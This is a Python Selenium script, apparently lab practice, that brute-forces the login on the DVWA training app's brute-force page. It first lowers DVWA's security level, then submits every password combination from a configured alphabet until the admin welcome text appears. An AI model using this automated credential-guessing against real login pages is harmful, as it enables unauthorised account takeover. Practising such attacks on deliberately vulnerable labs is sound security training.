from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
# from webdriver_manager.chrome import ChromeDriverManager
import itertools
import config
# import os
import time


def change_security_level(driver_, security_level: str):
    """
    security_level: 'low', 'medium', 'high', 'impossible'
    """
    driver_.get(f"{tunnel_url}/DVWA/security.php")

    select_element = driver_.find_element(By.NAME, 'security')

    select = Select(select_element)

    select.select_by_value(security_level)

    submit_button = driver_.find_element(By.NAME, 'seclev_submit')
    submit_button.click()


# Настройки для Supermium
options = webdriver.ChromeOptions()
options.binary_location = r"F:\Browsers\Supermium\chrome.exe"
# options.add_argument('--incognito')

# https://sites.google.com/chromium.org/driver/downloads
# https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json

# Инициализация браузера
driver = webdriver.Chrome(service=Service("chromedriver.exe"), options=options)

tunnel_url = "https://fond-poetic-gelding.ngrok-free.app"
brute_url = f"{tunnel_url}/DVWA/vulnerabilities/brute/"
# driver.get(f"{tunnel_url}/DVWA")
start_time = time.time()
print(f"Старт: {round(start_time, 2)}")

driver.get(brute_url)


try:
    # Подтверждение входа в ngrok
    button = WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.XPATH, "//button[text()='Visit Site']"))
    )

    button.click()

    # Авторизация в DVWA
    driver.find_element(By.NAME, "username").send_keys(config.DVWA_LOGIN)
    driver.find_element(By.NAME, "password").send_keys(config.DVWA_PASSWORD)
    driver.find_element(By.NAME, "Login").click()

    change_security_level(driver, "low")

    temp_count = 0
    retries_num = 5
    # retries_num = 6

    for password_tuple in itertools.product(config.ALPHABET, repeat=config.PASSWORD_LENGTH):
        # if temp_count >= retries_num:
        #     # print(temp_count)
        #     break
        # temp_count += 1
        driver.get(brute_url)
        driver.find_element(By.NAME, "username").send_keys(config.DVWA_LOGIN)
        password = ''.join(password_tuple)
        driver.find_element(By.NAME, "password").send_keys(password)
        driver.find_element(By.NAME, "Login").click()

        # paragraph = WebDriverWait(driver, 10).until(
        #     # EC.visibility_of_element_located((By.XPATH, "//p/text"))
        #     EC.visibility_of_element_located((By.TAG_NAME, "pre"))
        # )
        # paragraph_text = paragraph.text
        # print(paragraph_text)
        paragraph = WebDriverWait(driver, 10).until(
            EC.visibility_of_element_located((By.TAG_NAME, "p"))
        )
        paragraph_text = paragraph.text
        # print(paragraph_text)

        if paragraph_text == "Welcome to the password protected area admin":
            print(paragraph_text)
            print(f"{config.DVWA_LOGIN}:{password}")
            break
        # break

    # driver.get(brute_url)
    # driver.find_element(By.NAME, "username").send_keys(config.DVWA_LOGIN)
    # driver.find_element(By.NAME, "password").send_keys(config.DVWA_PASSWORD)
    # driver.find_element(By.NAME, "Login").click()
    # paragraph = WebDriverWait(driver, 10).until(
    #     EC.visibility_of_element_located((By.TAG_NAME, "p"))
    # )
    # paragraph_text = paragraph.text
    # print(paragraph_text)
    # if paragraph_text == "Welcome to the password protected area admin":
    #     print(f"{config.DVWA_LOGIN}:{config.DVWA_PASSWORD}")

    # driver.get(brute_url)
    # user_token = driver.find_element(By.NAME, "user_token").get_attribute("value")
    # url = f"{brute_url}?username=USER&password=PASS&user_token={user_token}&Login=Login"
    # driver.get(url)
    end_time = time.time()
    print(f"Время выполнения: {round(end_time - start_time, 2)} секунд")

    time.sleep(20)
    # time.sleep(100)
finally:
    driver.quit()
